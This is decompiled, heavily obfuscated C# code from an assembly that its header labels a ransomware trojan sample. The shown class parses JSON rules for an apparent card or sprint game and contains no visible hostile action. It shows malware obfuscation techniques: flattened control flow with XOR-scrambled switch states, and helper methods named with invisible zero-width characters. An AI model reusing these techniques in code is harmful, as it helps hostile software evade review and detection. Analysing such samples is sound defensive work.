// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: BaseConfigHandl, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 8D741A15-4AC4-4AEF-B040-FB58D745B7BF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d821a006c277a3233bf056c5fcd528f49e8482ec7c153568c098d86915113f2c.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 817278206;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2126812292)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 689345871 ^ 1511235068;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -144801124;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1172240297)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -854309990 ^ 177898234;
            continue;
          case 3:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * 257670117 ^ 913274166;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = -244644933;
      int aIndex;
      float[] numArray;
      bool flag;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1547045611)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            riskChances = numArray;
            num1 = (int) num2 * 1693169901 ^ -706287614;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -737458459;
            continue;
          case 4:
            flag = aIndex < numArray.Length;
            num1 = -436402097;
            continue;
          case 5:
            ++aIndex;
            num1 = (int) num2 * -226492861 ^ 965845376;
            continue;
          case 6:
            int num3 = flag ? -1623607695 : (num3 = -1328746555);
            num1 = num3 ^ (int) num2 * 2141737848;
            continue;
          case 7:
            num1 = (int) num2 * 1172419054 ^ 2138311272;
            continue;
          case 8:
            numArray = new float[json.Count];
            num1 = (int) num2 * 2032161696 ^ 730245335;
            continue;
          case 9:
            num1 = (int) num2 * 11496410 ^ -733154058;
            continue;
          case 10:
            aIndex = 0;
            num1 = (int) num2 * -593747180 ^ -1998798599;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
      List<Card> cardList = new List<Card>();
      int aIndex1 = 0;
label_1:
      int num1 = 589627923;
      bool flag1;
      int aIndex2;
      JSONNode jsonNode;
      bool flag2;
      int num2;
      bool flag3;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 450582823)) % 20U)
        {
          case 0:
            num1 = 623570090;
            continue;
          case 1:
            num2 = 0;
            num1 = (int) num3 * 2055278020 ^ -1501958224;
            continue;
          case 2:
            flag3 = aIndex2 < maxImpact * 2;
            num1 = 1107951109;
            continue;
          case 3:
            num1 = (int) num3 * 86317971 ^ 1720540841;
            continue;
          case 4:
            num1 = (int) num3 * -1909750478 ^ -1056954583;
            continue;
          case 5:
            array = cardList.ToArray();
            num1 = (int) num3 * 371088448 ^ -1436632089;
            continue;
          case 6:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = 857261982;
            continue;
          case 7:
            num1 = (int) num3 * 42579250 ^ 373974875;
            continue;
          case 8:
            ++num2;
            num1 = (int) num3 * -222482652 ^ 6058064;
            continue;
          case 9:
            num1 = (int) num3 * -931760514 ^ 1427042593;
            continue;
          case 10:
            int num4;
            num1 = num4 = aIndex1 >= count ? 1332369250 : (num4 = 1681195463);
            continue;
          case 11:
            flag2 = num2 < jsonNode[aIndex2].AsInt;
            num1 = 548909390;
            continue;
          case 13:
            int num5 = !flag2 ? 1557633797 : (num5 = 2029089453);
            num1 = num5 ^ (int) num3 * -807709223;
            continue;
          case 14:
            int num6 = !flag3 ? -1842008218 : (num6 = -1922501567);
            num1 = num6 ^ (int) num3 * 157434083;
            continue;
          case 15:
            ++aIndex2;
            num1 = (int) num3 * 777871759 ^ 1867638020;
            continue;
          case 16:
            jsonNode = json[aIndex1];
            aIndex2 = 0;
            num1 = 152838025;
            continue;
          case 17:
            goto label_1;
          case 18:
            ++aIndex1;
            num1 = (int) num3 * 1836275344 ^ -596811743;
            continue;
          case 19:
            flag1 = aIndex2 < maxImpact;
            num1 = 27050081;
            continue;
          default:
            goto label_21;
        }
      }
label_21:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -38623974;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -659126949)) % 4U)
        {
          case 1:
            str = Rules.\u200C⁬‪⁪‏⁫‬⁫⁭‍⁫‏⁪‍‏‎‪​‪‬‌‎‍⁭⁭‬‌‬‬⁬‪‭‮⁯‏‪‎‮‪⁫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -753247003 ^ -1754143539;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -480924074 ^ -848781727;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 1527006255;
      int index;
      bool flag;
      string str1;
      Card card1;
      int num2;
      Card[] cards;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1651493124)) % 18U)
        {
          case 0:
            str1 = Rules.\u200B​‪‌⁪‮‪‬⁬⁭⁮⁭⁪⁮​‬⁪⁫⁯⁬⁬‪⁮‮⁯‭⁪‍‫‬⁪⁯⁮‌‍⁪‌⁬‪‬‮(str1, "\n\t");
            num1 = (int) num3 * -2059711029 ^ -986866633;
            continue;
          case 1:
            num2 = card1.Type;
            num1 = (int) num3 * -1151771135 ^ -1940559050;
            continue;
          case 2:
            num2 = 0;
            num1 = (int) num3 * 14497351 ^ 316898202;
            continue;
          case 3:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200B⁮⁯⁬⁪⁪⁮⁫⁫⁪‏‏‏⁭‏⁫⁪⁭⁫‪‮‏⁬⁯​‍‬‬‫‪⁮⁭⁯⁫⁪⁬​‪‎‫‮((object) card2) : (string) null;
            str1 = Rules.\u200F‮‌‫​‌⁮‪‬‎‎⁯‫‌⁫‍⁪​‌‮‏‏⁪‫⁯‮⁫‬‭⁮⁬‍‍‏​‌⁯‏‌⁫‮(str3, str4, " ");
            num1 = 466963423;
            continue;
          case 4:
            card1 = cards[index];
            num1 = 1351524531;
            continue;
          case 5:
            num1 = (int) num3 * 985639518 ^ -2012679124;
            continue;
          case 6:
            cards = this.Cards;
            num1 = (int) num3 * -1338674646 ^ 1172320140;
            continue;
          case 7:
            int num4;
            num1 = num4 = index >= cards.Length ? 1778805374 : (num4 = 1288884598);
            continue;
          case 8:
            int num5 = !flag ? 739822791 : (num5 = 1963223632);
            num1 = num5 ^ (int) num3 * 2115121997;
            continue;
          case 9:
            str1 = "[\n\t";
            num1 = (int) num3 * -702092818 ^ 362678672;
            continue;
          case 11:
            ++index;
            num1 = (int) num3 * 345013473 ^ 1208346338;
            continue;
          case 12:
            flag = num2 != card1.Type;
            num1 = (int) num3 * -1928141553 ^ 2091599910;
            continue;
          case 13:
            num1 = (int) num3 * -815404783 ^ 1937876354;
            continue;
          case 14:
            str2 = Rules.\u200B​‪‌⁪‮‪‬⁬⁭⁮⁭⁪⁮​‬⁪⁫⁯⁬⁬‪⁮‮⁯‭⁪‍‫‬⁪⁯⁮‌‍⁪‌⁬‪‬‮(str1, "\n]");
            num1 = (int) num3 * -1223115048 ^ 174170570;
            continue;
          case 15:
            goto label_1;
          case 16:
            index = 0;
            num1 = (int) num3 * 1928880761 ^ 1965628269;
            continue;
          case 17:
            num1 = (int) num3 * 1476604908 ^ -1905773547;
            continue;
          default:
            goto label_19;
        }
      }
label_19:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u200B​‪‌⁪‮‪‬⁬⁭⁮⁭⁪⁮​‬⁪⁫⁯⁬⁬‪⁮‮⁯‭⁪‍‫‬⁪⁯⁮‌‍⁪‌⁬‪‬‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206D‏⁫​‪‫⁬⁬‏‎⁭​⁫⁮‫​‬⁪‮‍⁯⁬‮⁯‏⁯⁪‫⁬⁯‫⁯‭⁪⁪‬‍‫⁪‫‮()));
      int index = 1;
label_1:
      int num1 = -23055525;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1695166265)) % 8U)
        {
          case 0:
            ++index;
            num1 = (int) num2 * -1532691976 ^ -414400035;
            continue;
          case 1:
            str1 = Rules.\u200F‮‌‫​‌⁮‪‬‎‎⁯‫‌⁫‍⁪​‌‮‏‏⁪‫⁯‮⁫‬‭⁮⁬‍‍‏​‌⁯‏‌⁫‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206D‏⁫​‪‫⁬⁬‏‎⁭​⁫⁮‫​‬⁪‮‍⁯⁬‮⁯‏⁯⁪‫⁬⁯‫⁯‭⁪⁪‬‍‫⁪‫‮()));
            num1 = -1194998433;
            continue;
          case 2:
            flag = index < this.RiskChances.Length;
            num1 = -179686342;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * -1181507424 ^ 758825757;
            continue;
          case 5:
            int num3 = !flag ? -737089895 : (num3 = -2143788810);
            num1 = num3 ^ (int) num2 * -1401194376;
            continue;
          case 6:
            str2 = Rules.\u200B​‪‌⁪‮‪‬⁬⁭⁮⁭⁪⁮​‬⁪⁫⁯⁬⁬‪⁮‮⁯‭⁪‍‫‬⁪⁯⁮‌‍⁪‌⁬‪‬‮(str1, " ]");
            num1 = (int) num2 * 1559266622 ^ -926873620;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    static string \u200C⁬‪⁪‏⁫‬⁫⁭‍⁫‏⁪‍‏‎‪​‪‬‌‎‍⁭⁭‬‌‬‬⁬‪‭‮⁯‏‪‎‮‪⁫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200B​‪‌⁪‮‪‬⁬⁭⁮⁭⁪⁮​‬⁪⁫⁯⁬⁬‪⁮‮⁯‭⁪‍‫‬⁪⁯⁮‌‍⁪‌⁬‪‬‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200B⁮⁯⁬⁪⁪⁮⁫⁫⁪‏‏‏⁭‏⁫⁪⁭⁫‪‮‏⁬⁯​‍‬‬‫‪⁮⁭⁯⁫⁪⁬​‪‎‫‮([In] object obj0) => obj0.ToString();

    static string \u200F‮‌‫​‌⁮‪‬‎‎⁯‫‌⁫‍⁪​‌‮‏‏⁪‫⁯‮⁫‬‭⁮⁬‍‍‏​‌⁯‏‌⁫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206D‏⁫​‪‫⁬⁬‏‎⁭​⁫⁮‫​‬⁪‮‍⁯⁬‮⁯‏⁯⁪‫⁬⁯‫⁯‭⁪⁪‬‍‫⁪‫‮() => CultureInfo.InvariantCulture;
  }
}
